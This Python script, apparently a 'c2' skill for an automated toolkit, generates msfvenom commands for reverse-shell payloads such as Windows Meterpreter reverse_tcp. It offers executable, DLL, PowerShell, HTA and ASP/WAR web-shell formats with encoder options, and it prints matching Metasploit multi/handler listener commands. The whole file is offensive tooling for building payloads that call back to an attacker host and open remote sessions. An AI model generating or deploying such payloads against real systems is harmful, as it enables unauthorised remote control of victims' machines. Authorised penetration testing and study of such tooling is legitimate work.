#!/usr/bin/env python3
"""Build msfvenom payload commands and matching Metasploit handler setup.

Usage:
  python skills/c2/scripts/msfvenom_gen.py --payload windows/x64/meterpreter/reverse_tcp --lhost 10.0.0.5 --lport 4444 --format exe -o payload.exe
"""

from __future__ import annotations

import argparse
import json
import shutil
import sys


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="msfvenom command generator.")
    parser.add_argument("--payload", required=True)
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", type=int, required=True)
    parser.add_argument(
        "--format",
        required=True,
        choices=[
            "exe",
            "dll",
            "ps1",
            "raw",
            "elf",
            "macho",
            "hta-psh",
            "asp",
            "aspx",
            "war",
            "jar",
        ],
    )
    parser.add_argument("-o", "--output", required=True)
    parser.add_argument("--encoder")
    parser.add_argument("--iterations", type=int)
    parser.add_argument("--arch", choices=["x86", "x64"])
    parser.add_argument("--platform")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    msfvenom = shutil.which("msfvenom")

    command = [
        msfvenom or "msfvenom",
        "-p",
        args.payload,
        f"LHOST={args.lhost}",
        f"LPORT={args.lport}",
        "-f",
        args.format,
        "-o",
        args.output,
    ]
    if args.encoder:
        command.extend(["-e", args.encoder])
    if args.iterations is not None:
        command.extend(["-i", str(args.iterations)])
    if args.arch:
        command.extend(["-a", args.arch])
    if args.platform:
        command.extend(["--platform", args.platform])

    handler_commands = [
        "use exploit/multi/handler",
        f"set PAYLOAD {args.payload}",
        f"set LHOST {args.lhost}",
        f"set LPORT {args.lport}",
        "run -j",
    ]

    print(" ".join(command))
    for line in handler_commands:
        print(line)

    payload = {
        "tool": msfvenom or "msfvenom",
        "tool_found": bool(msfvenom),
        "msfvenom_command": command,
        "handler_commands": handler_commands,
    }
    if not msfvenom:
        print("[!] msfvenom not found. Command printed only.", file=sys.stderr)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
